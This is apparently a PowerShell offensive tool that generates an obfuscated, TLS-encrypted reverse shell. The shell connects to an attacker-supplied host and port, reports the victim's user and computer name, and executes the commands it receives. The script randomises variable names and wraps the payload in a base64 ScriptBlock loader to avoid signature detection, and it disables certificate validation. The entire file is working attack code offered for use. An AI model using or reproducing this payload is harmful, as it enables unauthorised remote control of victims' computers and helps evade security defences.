function Invoke-PSObfuscator {
    # Param part is like error handling (we can ignore to ease mind)
    param( # Makes sure the function is given the payload script to decode and run and doesn't silently fail or do nothing
        [Parameter(Mandatory=$true)] #  Requires a value to be entered before it will run 
        [string]$InputScript # InputScript is declared as a string and will execute if explicitly called to execute like with "&" sign, exmple: "& $InputScript" 
    )

    # This is an obfuscator that converts string into bytes [72, 0, 105, 0] and then base64
    function Get-EncodedString {
        param([string]$text)  # declares $text as string
        return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($text)) # Convert into byte array and then base64
    }

    # Single-layer obfuscation for reliability
    $encodedScript = Get-EncodedString $InputScript # Turns the wraperLoaderForPayload into base64
    # @" makes it a multi-line string to be executed for each line at once
    # Then [System.Text.Encoding]::Unicode is a .NET function and we basically make $enc that
    # After that we take the base64 version of our reverseshell and turn it into raw bytes
    $wraperLoaderForPayload = @"
`$enc = [System.Text.Encoding]::Unicode
`$decoded = `$enc.GetString([Convert]::FromBase64String('$encodedScript'))
`$scriptBlock = [ScriptBlock]::Create(`$decoded)
& `$scriptBlock
"@
    return $wraperLoaderForPayload
}

function New-ReverseShell { # This function is the actual reverseshell payload 
    param(
        [string]$LHOST, # Declared then called later in the code for user input
        [int]$LPORT # Declared then called later in the code for user input
    )

    function signatureGenerator {
        $prefixes = @("Net", "Conn", "Data", "Stream", "Buffer", "Output", "Input", "Client", "Server", "Remote", "Socket", "Channel", "Link", "Bridge", "Flow", "Pipe")
        $suffixes = @("Handler", "Manager", "Reader", "Writer", "Stream", "Buffer", "Client", "Data", "Flow", "Pipe", "Store", "Cache", "Hold", "Temp", "Core", "Base")
        
        # Fixed randomness using GUID seed
        $rng = New-Object System.Random ([int]([System.Guid]::NewGuid().GetHashCode()))
        $signatures = @{}
        $keys = @('LHOST','LPORT','TCPClient','TlsStream','StreamReader','StreamWriter','Buffer','Code','Output','ActualTls','MinChunk','MaxChunk','MinDelay','MaxDelay')
        
        foreach ($key in $keys) {
            $prefix = $prefixes[$rng.Next(0, $prefixes.Count)]
            $suffix = $suffixes[$rng.Next(0, $suffixes.Count)]
            $signatures[$key] = "$prefix$suffix"
        }
        
        $paddingWords = @("obfuscated", "randomized", "secured", "encoded", "protected", "stealth", "cloaked", "masked")
        $count = Get-Random -Minimum 1 -Maximum 4
        $selectedWords = $paddingWords | Get-Random -Count $count
        $signatures['Padding'] = "# " + ($selectedWords -join " ")
        
        return $signatures
    }
    
    $sigs = signatureGenerator    

    $tlsCode = @"
# Smart TLS version detection and setup - TLS 1.3 with automatic fallback to TLS 1.2
`$$($sigs['ActualTls']) = "TLS 1.2"
try {
    # Attempt TLS 1.3 first (modern security)
    `$tls13Supported = `$false
    
    # Check PowerShell version and OS compatibility
    `$psVersion = `$PSVersionTable.PSVersion.Major
    `$osVersion = [System.Environment]::OSVersion.Version
    `$build = [System.Environment]::OSVersion.Version.Build
    
    # PowerShell 7+ has better TLS 1.3 support
    if (`$psVersion -ge 7) {
        try {
            # Try to enable TLS 1.3
            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls13 -bor [System.Net.SecurityProtocolType]::Tls12
            `$$($sigs['ActualTls']) = "TLS 1.3"
            `$tls13Supported = `$true
        } catch {
            `$tls13Supported = `$false
        }
    } else {
        # PowerShell 5.1 - check if TLS 1.3 is available
        try {
            `$tls13Field = [System.Net.SecurityProtocolType].GetField('Tls13')
            if (`$tls13Field -ne `$null) {
                # Check OS compatibility (Windows 10 2004+ or Server 2022+)
                if ((`$osVersion.Major -gt 10) -or (`$osVersion.Major -eq 10 -and `$build -ge 19041)) {
                    try {
                        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls13 -bor [System.Net.SecurityProtocolType]::Tls12
                        `$$($sigs['ActualTls']) = "TLS 1.3"
                        `$tls13Supported = `$true
                    } catch {
                        `$tls13Supported = `$false
                    }
                }
            }
        } catch {
            `$tls13Supported = `$false
        }
    }
    
    # Fallback to TLS 1.2 if TLS 1.3 not supported
    if (-not `$tls13Supported) {
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
        `$$($sigs['ActualTls']) = "TLS 1.2 (fallback)"
    }
} catch {
    # Final fallback to TLS 1.2
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    `$$($sigs['ActualTls']) = "TLS 1.2 (error fallback)"
}

# SSL/TLS configuration
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {
    param(`$sender, `$certificate, `$chain, `$sslPolicyErrors)
    return `$true
}
[System.Net.ServicePointManager]::CheckCertificateRevocationList = `$false
[System.Net.ServicePointManager]::Expect100Continue = `$false
"@
    
    $minChunkVal = Get-Random -Minimum 256 -Maximum 512
    $maxChunkVal = Get-Random -Minimum ($minChunkVal + 512) -Maximum 2048
    $minDelayVal = Get-Random -Minimum 10 -Maximum 50
    $maxDelayVal = Get-Random -Minimum ($minDelayVal + 50) -Maximum 400

    $vLHOST = $sigs['LHOST']
    $vLPORT = $sigs['LPORT']
    $vTCPClient = $sigs['TCPClient']
    $vTlsStream = $sigs['TlsStream']
    $vStreamReader = $sigs['StreamReader']
    $vStreamWriter = $sigs['StreamWriter']
    $vBuffer = $sigs['Buffer']
    $vCode = $sigs['Code']
    $vOutput = $sigs['Output']
    $vActualTls = $sigs['ActualTls']
    $vMinChunk = $sigs['MinChunk']
    $vMaxChunk = $sigs['MaxChunk']
    $vMinDelay = $sigs['MinDelay']
    $vMaxDelay = $sigs['MaxDelay']

    return @"
$($sigs['Padding'])
# Advanced TLS Reverse Shell - Auto TLS 1.3/1.2 with Robust Connection Handling
$tlsCode
`$$vLHOST = "$LHOST"
`$$vLPORT = $LPORT
`$$vMinChunk = $minChunkVal
`$$vMaxChunk = $maxChunkVal
`$$vMinDelay = $minDelayVal
`$$vMaxDelay = $maxDelayVal

`$global:CleanupInProgress = `$false
`$global:GracefulShutdown = `$false
`$global:ConnectionActive = `$false

# CTRL+C Handler for graceful shutdown
try {
    [Console]::TreatControlCAsInput = `$false
    Register-EngineEvent PowerShell.Exiting -Action {
        if (-not `$global:CleanupInProgress -and -not `$global:GracefulShutdown) {
            `$global:CleanupInProgress = `$true
            `$global:ConnectionActive = `$false
            
            try {
                # Send termination notice
                if (`$$vStreamWriter -and `$$vTlsStream -and `$$vTlsStream.CanWrite) {
                    `$$vStreamWriter.WriteLine("[!] Connection terminated by user")
                    `$$vStreamWriter.Flush()
                }
                
                # TLS shutdown sequence
                if (`$$vTlsStream -and `$$vTlsStream.IsAuthenticated) {
                    try {
                        `$$vTlsStream.ShutdownAsync().Wait(1000)  # 1 second timeout
                    } catch {}
                }
                
                # Close streams
                if (`$$vStreamWriter) { `$$vStreamWriter.Dispose() }
                if (`$$vStreamReader) { `$$vStreamReader.Dispose() }
                if (`$$vTlsStream) { `$$vTlsStream.Dispose() }
                
                # TCP graceful close
                if (`$$vTCPClient -and `$$vTCPClient.Connected) {
                    `$socket = `$$vTCPClient.Client
                    try {
                        `$socket.Shutdown([System.Net.Sockets.SocketShutdown]::Send)
                        Start-Sleep -Milliseconds 100
                        `$socket.Shutdown([System.Net.Sockets.SocketShutdown]::Both)
                        Start-Sleep -Milliseconds 50
                    } catch {}
                    `$$vTCPClient.Close()
                }
            } catch {}
        }
    } | Out-Null
} catch {}

try {
    # Create TcpClient with robust configuration
    `$$vTCPClient = New-Object Net.Sockets.TcpClient
    `$socket = `$$vTCPClient.Client
    
    # Configure socket before connection
    `$socket.ReceiveTimeout = -1  # Infinite timeout
    `$socket.SendTimeout = 30000  # 30 second timeout for sends
    `$socket.NoDelay = `$true
    `$socket.ReceiveBufferSize = 65536
    `$socket.SendBufferSize = 65536
    
    # Connect with timeout
    `$connectTask = `$$vTCPClient.ConnectAsync(`$$vLHOST, `$$vLPORT)
    `$connected = `$connectTask.Wait(10000)  # 10 second timeout
    
    if (-not `$connected -or -not `$$vTCPClient.Connected) {
        throw "Connection failed or timed out"
    }
    
    # Additional socket configuration after connection
    `$socket.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, [System.Net.Sockets.SocketOptionName]::KeepAlive, `$true)
    `$socket.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Tcp, [System.Net.Sockets.SocketOptionName]::NoDelay, `$true)
    
    # Get network stream
    `$networkStream = `$$vTCPClient.GetStream()
    `$networkStream.ReadTimeout = -1  # Infinite read timeout
    `$networkStream.WriteTimeout = 30000  # 30 second write timeout
    
    # Create TLS stream with robust configuration
    `$$vTlsStream = New-Object System.Net.Security.SslStream(
        `$networkStream, 
        `$false, 
        ([System.Net.Security.RemoteCertificateValidationCallback] {
            param(`$sender, `$certificate, `$chain, `$sslPolicyErrors)
            return `$true
        })
    )
    
    # TLS Authentication with smart protocol selection
    try {
        if (`$$vActualTls.StartsWith("TLS 1.3")) {
            # Try TLS 1.3 first, fallback to 1.2
            try {
                `$enabledProtocols = [System.Security.Authentication.SslProtocols]::Tls13 -bor [System.Security.Authentication.SslProtocols]::Tls12
                `$$vTlsStream.AuthenticateAsClient(`$$vLHOST, `$null, `$enabledProtocols, `$false)
                `$$vActualTls = "TLS 1.3"
            } catch {
                # Fallback to TLS 1.2
                `$$vTlsStream.AuthenticateAsClient(`$$vLHOST, `$null, [System.Security.Authentication.SslProtocols]::Tls12, `$false)
                `$$vActualTls = "TLS 1.2 (auth fallback)"
            }
        } else {
            # Use TLS 1.2
            `$$vTlsStream.AuthenticateAsClient(`$$vLHOST, `$null, [System.Security.Authentication.SslProtocols]::Tls12, `$false)
        }
    } catch {
        # Final fallback to basic authentication
        `$$vTlsStream.AuthenticateAsClient(`$$vLHOST)
        `$$vActualTls = "TLS 1.2 (basic auth)"
    }
    
    # Verify TLS is working
    if (-not `$$vTlsStream.IsAuthenticated) {
        throw "TLS authentication failed"
    }
    
    # Create stream readers/writers with proper encoding and buffering
    `$$vStreamReader = New-Object System.IO.StreamReader(`$$vTlsStream, [System.Text.Encoding]::UTF8, `$false, 4096)
    `$$vStreamWriter = New-Object System.IO.StreamWriter(`$$vTlsStream, [System.Text.Encoding]::UTF8, 4096)
    `$$vStreamWriter.AutoFlush = `$false  # Manual flush for better control
    
    `$global:ConnectionActive = `$true
    
} catch {
    # Comprehensive cleanup on connection failure
    if (`$$vStreamWriter) { try { `$$vStreamWriter.Dispose() } catch {} }
    if (`$$vStreamReader) { try { `$$vStreamReader.Dispose() } catch {} }
    if (`$$vTlsStream) { try { `$$vTlsStream.Dispose() } catch {} }
    if (`$networkStream) { try { `$networkStream.Dispose() } catch {} }
    if (`$$vTCPClient) { try { `$$vTCPClient.Close() } catch {} }
    
    Write-Host "[!] Connection failed to `$$vLHOST::`$$vLPORT" -ForegroundColor Red
    Write-Host "[!] Error: `$(`$_.Exception.Message)" -ForegroundColor Red
    return
}

# Simple send function with error handling
function Send-Data {
    param([string]`$data)
    
    if (-not `$global:ConnectionActive -or `$global:CleanupInProgress) {
        return `$false
    }
    
    try {
        if (`$$vTlsStream -and `$$vTlsStream.CanWrite -and `$$vStreamWriter) {
            `$$vStreamWriter.Write(`$data)
            `$$vStreamWriter.Flush()
            return `$true
        }
    } catch {
        `$global:ConnectionActive = `$false
        return `$false
    }
    return `$false
}

# Robust read function with timeout handling
function Read-Command {
    try {
        if (-not `$global:ConnectionActive -or `$global:CleanupInProgress -or -not `$$vStreamReader) {
            return `$null
        }
        
        # Check if data is available
        `$attempts = 0
        while (`$attempts -lt 100 -and `$global:ConnectionActive) {
            try {
                if (`$$vTCPClient.Available -gt 0) {
                    return `$$vStreamReader.ReadLine()
                }
            } catch {
                `$global:ConnectionActive = `$false
                return `$null
            }
            Start-Sleep -Milliseconds 100
            `$attempts++
        }
        return `$null
    } catch {
        `$global:ConnectionActive = `$false
        return `$null
    }
}

# Graceful shutdown function
function Graceful-Shutdown {
    if (`$global:CleanupInProgress) { return }
    `$global:CleanupInProgress = `$true
    `$global:ConnectionActive = `$false
    
    try {
        # Send final message and flush
        if (`$vStreamWriter -and `$vTlsStream -and `$vTlsStream.CanWrite) {
            try {
                `$vStreamWriter.WriteLine("[*] Connection terminating gracefully...")
                `$vStreamWriter.Flush()
                Start-Sleep -Milliseconds 200  # Give more time for data to transmit
            } catch {}
        }
        
        # Close application streams first (but keep TLS stream open temporarily)
        if (`$vStreamWriter) { 
            try { 
                `$vStreamWriter.Close()
                `$vStreamWriter.Dispose() 
            } catch {} 
        }
        if (`$vStreamReader) { 
            try { 
                `$vStreamReader.Close()
                `$vStreamReader.Dispose() 
            } catch {} 
        }
        
        # Give time for any pending data to be processed
        Start-Sleep -Milliseconds 300
        
        # Now handle the TCP socket directly to avoid empty segments
        if (`$vTCPClient -and `$vTCPClient.Connected) {
            try {
                `$socket = `$vTCPClient.Client
                
                # Configure socket for clean closure
                `$socket.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, 
                                       [System.Net.Sockets.SocketOptionName]::DontLinger, 
                                       `$false)
                
                # Set a proper linger timeout
                `$lingerOption = New-Object System.Net.Sockets.LingerOption(`$true, 2)
                `$socket.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, 
                                       [System.Net.Sockets.SocketOptionName]::Linger, 
                                       `$lingerOption)
                
                # Disable Nagle algorithm to prevent segment coalescing
                `$socket.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Tcp, 
                                       [System.Net.Sockets.SocketOptionName]::NoDelay, 
                                       `$true)
                
                # Shutdown send side first and wait
                `$socket.Shutdown([System.Net.Sockets.SocketShutdown]::Send)
                Start-Sleep -Milliseconds 250
                
                # Check if there's any data to receive before full shutdown
                try {
                    `$available = `$socket.Available
                    if (`$available -gt 0) {
                        Start-Sleep -Milliseconds 100  # Wait for data to be processed
                    }
                } catch {}
                
                # Complete shutdown
                `$socket.Shutdown([System.Net.Sockets.SocketShutdown]::Both)
                Start-Sleep -Milliseconds 150
                
            } catch {}
        }
        
        # Now close TLS stream
        if (`$vTlsStream) { 
            try { 
                # Attempt graceful TLS close
                if (`$vTlsStream.IsAuthenticated) {
                    `$vTlsStream.ShutdownAsync().Wait(1000)  # 1 second timeout
                }
                `$vTlsStream.Close()
                `$vTlsStream.Dispose() 
            } catch {} 
        }
        
        # Finally close TCP client
        if (`$vTCPClient) {
            try {
                `$vTCPClient.Close()
                `$vTCPClient.Dispose()
            } catch {}
        }
        
    } catch {}
}

# Send initial connection message
`$connectMsg = "`n[+] `$$vActualTls Shell Connected as $env:username@$env:computername`n"
`$connectMsg += "[*] Chunk: $minChunkVal-$maxChunkVal bytes | Delay: $minDelayVal-$maxDelayVal ms`n"
`$connectMsg += "[*] Protocol: `$$vActualTls | PowerShell: `$(`$PSVersionTable.PSVersion)`n"
`$connectMsg += "[!] Auto TLS 1.3 with fallback enabled`n"
`$connectMsg += "[!] To close: type 'exit'`nPS > "

if (-not (Send-Data `$connectMsg)) {
    if (-not `$global:CleanupInProgress) {
        try {
            if (`$$vStreamWriter) { `$$vStreamWriter.Dispose() }
            if (`$$vStreamReader) { `$$vStreamReader.Dispose() }
            if (`$$vTlsStream) { `$$vTlsStream.Dispose() }
            if (`$$vTCPClient) { `$$vTCPClient.Close() }
        } catch {}
    }
    return
}

# Main command loop with robust error handling
try {
    while (`$global:ConnectionActive -and -not `$global:CleanupInProgress) {
        `$command = Read-Command
        
        if (`$command -eq `$null) {
            # No command received, connection might be closed
            if (-not `$global:ConnectionActive) { break }
            continue
        }
        
        if (`$command -eq "exit" -or `$command -eq "quit") {
            # Enhanced exit handling to prevent empty segments
            try {
                Send-Data "`n[*] Exiting shell...`n"
                Start-Sleep -Milliseconds 300  # Give time for message to be received
                
                # Mark as graceful shutdown
                `$global:GracefulShutdown = `$true
                
                # Stop reading loop immediately 
                `$global:ConnectionActive = `$false
                
                # Perform graceful shutdown
                Graceful-Shutdown
                break
            } catch {
                # Fallback to immediate cleanup if graceful fails
                `$global:ConnectionActive = `$false
                break
            }
        }
        
        # Execute command with proper error handling
        try {
            `$result = ""
            if (-not [string]::IsNullOrWhiteSpace(`$command)) {
                `$output = Invoke-Expression `$command 2>&1 | Out-String
                if (-not [string]::IsNullOrWhiteSpace(`$output)) {
                    `$result = `$output
                }
            }
            
            # Send result back
            if (-not [string]::IsNullOrEmpty(`$result)) {
                if (-not (Send-Data `$result)) { break }
            }
            if (-not (Send-Data "`nPS > ")) { break }
            
        } catch {
            `$errorMsg = "Error: `$(`$_.Exception.Message)`nPS > "
            if (-not (Send-Data `$errorMsg)) { break }
        }
    }
} catch {
    # Main loop error
    `$global:ConnectionActive = `$false
} finally {
    if (`$global:GracefulShutdown) {
        # Already handled gracefully, just cleanup events
        try {
            Unregister-Event -SourceIdentifier "PowerShell.Exiting" -Force -ErrorAction SilentlyContinue
        } catch {}
    } else {
        # Emergency cleanup
        if (-not `$global:CleanupInProgress) {
            `$global:CleanupInProgress = `$true
            `$global:ConnectionActive = `$false
            
            try {
                # Quick cleanup without waiting
                if (`$$vStreamWriter) { `$$vStreamWriter.Dispose() }
                if (`$$vStreamReader) { `$$vStreamReader.Dispose() }
                if (`$$vTlsStream) { `$$vTlsStream.Dispose() }
                
                if (`$$vTCPClient -and `$$vTCPClient.Connected) {
                    `$socket = `$$vTCPClient.Client
                    # Set RST prevention
                    `$socket.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, 
                                           [System.Net.Sockets.SocketOptionName]::Linger, 
                                           (New-Object System.Net.Sockets.LingerOption(`$false, 0)))
                    `$socket.Shutdown([System.Net.Sockets.SocketShutdown]::Both)
                    `$$vTCPClient.Close()
                }
            } catch {}
        }
        
        try {
            Unregister-Event -SourceIdentifier "PowerShell.Exiting" -Force -ErrorAction SilentlyContinue
        } catch {}
    }
}

"@
}